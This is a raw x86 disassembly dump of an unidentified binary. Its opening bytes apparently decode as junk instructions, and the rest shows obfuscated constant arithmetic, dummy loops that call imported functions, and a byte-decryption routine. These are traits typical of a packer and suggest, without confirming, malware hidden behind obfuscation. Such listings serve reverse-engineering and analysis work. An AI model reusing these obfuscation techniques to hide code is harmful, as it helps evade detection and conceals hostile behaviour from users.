  41ad36:	xlat   BYTE PTR ds:[ebx]
  41ad37:	test   eax,0x9e0917ab
  41ad3c:	sbb    eax,0x12bf98e3
  41ad41:	out    0x44,al
  41ad43:	adc    dh,BYTE PTR [edx+0x71b60e45]
  41ad49:	mov    ebp,0xf25eb2ae
  41ad4e:	pop    ebx
  41ad4f:	mov    ah,0xaf
  41ad51:	test   DWORD PTR [ecx-0x24b62577],edx
  41ad57:	cli    
  41ad58:	mov    al,ds:0x287c541
  41ad5d:	mov    ch,ah
  41ad5f:	enter  0xdcfe,0x8d
  41ad63:	fmul   st,st(6)
  41ad65:	clc    
  41ad66:	xor    eax,0x3bbe5e25
  41ad6b:	mov    esi,0x6c908b35
  41ad70:	aad    0x14
  41ad72:	mov    al,ds:0x5d4c1bbc
  41ad77:	cmp    BYTE PTR [edx+0x19],dh
  41ad7a:	mov    bl,BYTE PTR [edi]
  41ad7c:	pop    ecx
  41ad7d:	sbb    eax,esp
  41ad7f:	xlat   BYTE PTR ds:[ebx]
  41ad80:	mov    ah,0xe5
  41ad82:	push   eax
  41ad83:	aaa    
  41ad84:	dec    ecx
  41ad85:	out    0x3d,eax
  41ad87:	fs cmp bh,dh
  41ad8a:	leave  
  41ad8b:	mul    cl
  41ad8d:	out    dx,al
  41ad8e:	out    dx,al
  41ad8f:	push   ss
  41ad90:	or     DWORD PTR [edi-0x69],ebp
  41ad93:	pop    eax
  41ad94:	ins    DWORD PTR es:[edi],dx
  41ad95:	and    eax,DWORD PTR [eax+0x25c034ba]
  41ad9b:	scas   eax,DWORD PTR es:[edi]
  41ad9c:	into   
  41ad9d:	call   0x3d69e919
  41ada2:	sbb    al,0x4
  41ada4:	(bad)  
  41ada5:	dec    eax
  41ada6:	mov    esi,0xcc179d9f
  41adab:	push   ds
  41adac:	bound  ebx,QWORD PTR [edi-0x2e82d7eb]
  41adb2:	lds    eax,FWORD PTR [esp+esi*8-0x3f]
  41adb6:	sub    esp,ecx
  41adb8:	sbb    esi,esi
  41adba:	stos   BYTE PTR es:[edi],al
  41adbb:	int    0xdc
  41adbd:	mov    esi,0x4ff669ac
  41adc2:	mov    ebp,DWORD PTR [ecx+0x1f]
  41adc5:	int3   
  41adc6:	inc    esp
  41adc7:	xcrypt-ctr (bad)
  41adc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adc9:	pop    ds
  41adca:	and    al,0x89
  41adcc:	(bad)  
  41adce:	out    0x42,eax
  41add0:	aaa    
  41add1:	sahf   
  41add2:	int    0xc4
  41add4:	sti    
  41add5:	ret    
  41add6:	dec    esi
  41add7:	je     0x41ae16
  41add9:	mov    esp,0x1af4d8da
  41adde:	jle    0x41ae1f
  41ade0:	add    eax,0x9e97181e
  41ade5:	cmp    DWORD PTR [esi],0x51b29f08
  41adeb:	in     al,dx
  41adec:	mov    DWORD PTR [ebp-0x8],eax
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c36
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421ab6
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cbe
  41afcc:	mov    ecx,DWORD PTR ds:0x421a2e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238f2
  41b017:	push   0x423872
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c36
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x42384d
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423864
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c56
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bac
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x4239c2
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d46,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
